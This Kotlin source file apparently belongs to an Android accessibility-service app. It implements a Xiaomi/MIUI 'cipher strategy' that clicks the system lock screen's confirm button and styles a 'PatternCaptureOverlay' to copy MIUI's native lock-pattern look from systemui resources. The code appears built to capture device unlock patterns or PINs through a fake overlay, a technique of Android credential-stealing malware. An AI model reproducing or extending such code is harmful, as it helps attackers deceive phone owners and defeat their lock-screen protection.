package com.storm.safe.rock.service.modules.cipher.vendor

import android.content.Context
import android.content.res.Resources
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.cipher.PatternLockView

/**
 * MIUI (Xiaomi / Redmi / POCO) cipher strategy.
 *
 * Extracted from CipherCaptureManager brand branches:
 * - clickConfirmButtonFull: MIUI btn_letter_ok
 * - PatternCaptureOverlay: MIUI fallback style + 50ms animation
 */
class MiuiCipherStrategy : CipherBrandStrategy() {

    override val tag = "MiuiCipher"

    companion object {
        /** MIUI confirm key suffix. vendor: CipherCaptureManager.MIUI_CONFIRM_KEY */
        private const val MIUI_CONFIRM_KEY = ":id/btn_letter_ok"
    }

    /**
     * MIUI confirm button: btn_letter_ok (TextView).
     * vendor: clickConfirmButtonFull MIUI branch
     */
    override fun clickBrandConfirmButton(
        root: AccessibilityNodeInfo,
        pkg: String,
        basePkg: String,
        findById: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        findByIdAndClass: (AccessibilityNodeInfo, String, String) -> AccessibilityNodeInfo?
    ): Boolean {
        val tvClass = "android.widget.TextView"
        // Try basePkg first
        var btn = findByIdAndClass(root, "$basePkg$MIUI_CONFIRM_KEY", tvClass)
        if (btn == null) {
            btn = findByIdAndClass(root, "com.android.systemui$MIUI_CONFIRM_KEY", tvClass)
        }
        if (btn != null && btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            Log.d(tag, "Clicked MIUI confirm: btn_letter_ok")
            return true
        }
        return false
    }

    /**
     * MIUI fallback pattern style.
     * Theme color, 50ms animation.
     * vendor: PatternCaptureOverlay MIUI branch
     */
    override fun applyPatternFallbackStyle(view: PatternLockView, themeColor: Int, density: Float) {
        val pathWidth = (density * 3f).toInt().coerceAtLeast(3)
        view.normalStateColor = themeColor
        view.correctStateColor = themeColor
        view.dotNormalSize = 30
        view.dotSelectedSize = 60
        view.dotSelectedColor = themeColor
        view.pathWidth = pathWidth
        view.pathColor = themeColor
        view.aspectRatio = 0
        view.dotAnimationDuration = 50
        view.pathEndAnimationDuration = 50
    }

    /**
     * MIUI resource reading: AOSP dot size + miui_ color resources.
     * vendor: PatternCaptureOverlay MIUI resource branch
     */
    override fun readBrandResources(res: Resources, suiContext: Context, density: Float): BrandResourceResult? {
        val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
        if (aospId == 0) return null
        val dotSize = res.getDimensionPixelSize(aospId)

        // MIUI color resources
        var dotColor = 0
        var pathColor = 0
        for (name in listOf("miui_lock_pattern_dot_color", "miui_pattern_dot_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                dotColor = res.getColor(id, suiContext.theme)
                break
            }
        }
        for (name in listOf("miui_lock_pattern_path_color", "miui_pattern_path_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                pathColor = res.getColor(id, suiContext.theme)
                break
            }
        }

        return BrandResourceResult(
            haloSize = dotSize * 3,
            innerDotSize = dotSize,
            pathWidth = 0,
            dotColor = dotColor,
            pathColor = pathColor
        )
    }

    override fun animationDurations(): Pair<Int, Int> = Pair(50, 50)
}
